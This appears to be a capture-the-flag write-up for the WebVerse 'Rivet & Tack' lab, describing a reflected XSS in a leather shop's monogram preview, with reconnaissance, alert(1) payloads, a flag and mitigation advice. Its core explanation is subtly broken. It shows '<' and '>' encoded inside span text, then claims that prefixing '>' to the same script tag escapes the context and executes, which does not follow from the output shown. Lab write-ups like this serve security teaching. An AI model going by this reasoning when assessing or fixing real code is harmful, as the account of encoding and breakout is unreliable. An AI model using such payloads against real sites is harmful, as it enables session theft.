---
title: "Cross-Site Scripting (XSS) – HTML Tag Breakout | Rivet & Tack"
date: 2026-05-30 00:00:00 +0530
categories: [A05 - Injection, Cross-Site Scripting (XSS)]
tags: [webversepro, xss, reflected-xss, html-injection, tag-breakout, client-side]
author: Shivansh Sharma
image:
  path: /assets/images/posts/rivet-and-tack-reflected-xss.webp
  alt: Cross-Site Scripting (XSS) – HTML Tag Breakout | Rivet & Tack
---

## Lab Link

Lab: [Rivet & Tack](https://dashboard.webverselabs-pro.com/challenges/rivet-and-tack)

---

## Overview

Rivet & Tack is a family-run leather shop with a monogram preview feature. The application reflects user-supplied initials back into the page so customers can preview how the monogram will appear.

The reflected value is partially encoded, which prevents a simple script payload from executing. However, the output context can still be broken by injecting markup that escapes the surrounding HTML structure.

By using an HTML tag breakout payload, JavaScript execution becomes possible.

This challenge demonstrates a reflected Cross-Site Scripting vulnerability caused by incomplete output handling.

---

## Objective

Identify the reflection point in the monogram preview feature, bypass the initial encoding behavior, execute JavaScript, and retrieve the flag.

---

## Vulnerability Identification

This challenge is primarily a Reflected Cross-Site Scripting vulnerability.

### Classification Hierarchy

A05 - Injection
└── Client-Side Injection
└── Cross-Site Scripting (XSS)
└── Reflected XSS via HTML Tag Breakout

---

## Reconnaissance

Open the monogram page:

```text
https://3e6f5f81-4065-rivet-and-tack-0e1e9.challenges.webverselabs-pro.com/monogram?item=wallet
```

Submit a simple test value in the initials field:

```text
test
```

View the page source and observe where the value is reflected:

```html
<span class="rt-proof-mono">test</span>
```

The user input is inserted inside a `<span>` element.

---

## Exploitation

### Step 1 - Test Basic XSS

Submit a standard script payload:

```html
<script>alert(1)</script>
```

The response encodes the payload:

```html
<span class="rt-proof-mono">&lt;script&gt;alert(1)&lt;/script&gt;</span>
```

Because `<` and `>` are encoded in this context, the browser renders the script tag as text instead of executing it.

This means a basic payload fails.

---

### Step 2 - Analyze the Output Context

The payload appears inside:

```html
<span class="rt-proof-mono">USER_INPUT</span>
```

A successful payload must escape the current rendering context and introduce executable HTML.

Since the basic script tag is encoded, testing context-breaking payloads is useful.

---

### Step 3 - Break Out of the Tag Context

Submit:

```html
><script>alert(1)</script>
```

This causes the browser to interpret the injected content as markup and execute the script.

The payload works because it changes how the browser parses the surrounding HTML.

---

### Step 4 - Trigger Flag Retrieval

After JavaScript execution occurs, the lab detects the reflected XSS and displays the flag.

```text
WEBVERSE{.....}
```

---

## Proof of Exploitation

### Reflection Point

```html
<span class="rt-proof-mono">test</span>
```

### Failed Payload

```html
<script>alert(1)</script>
```

### Encoded Output

```html
<span class="rt-proof-mono">&lt;script&gt;alert(1)&lt;/script&gt;</span>
```

### Working Payload

```html
><script>alert(1)</script>
```

### Flag

```text
WEBVERSE{.....}
```

---

## Impact

An attacker can execute arbitrary JavaScript in another user's browser.

Potential impact includes:

* Session theft
* Account takeover
* Credential harvesting
* Page manipulation
* Malicious redirects
* Data exfiltration
* CSRF bypass

Even when basic payloads appear blocked, incomplete output handling can still leave exploitable contexts.

---

## Mitigation

### Apply Context-Aware Output Encoding

Encode user-controlled data based on where it appears in the document.

### Treat All Reflections as Dangerous

Any reflected user input should be reviewed for XSS, even if simple payloads are encoded.

### Use Safe Rendering APIs

Prefer text-only insertion methods such as:

```javascript
element.textContent = userInput;
```

Avoid unsafe rendering methods such as:

```javascript
element.innerHTML = userInput;
```

### Validate Input Format

For initials, only allow a small expected character set:

```text
A-Z
a-z
.
-
spaces
```

### Implement Content Security Policy

A restrictive CSP can reduce XSS impact.

---

## Real-World Insight

XSS testing requires understanding the output context.

A payload that fails in one context may succeed after escaping into another. Developers often test only obvious payloads and assume the application is safe when `<script>` is encoded.

The Rivet & Tack challenge highlights an important lesson:

**Blocking one payload is not the same as safely encoding user input for every browser parsing context.**
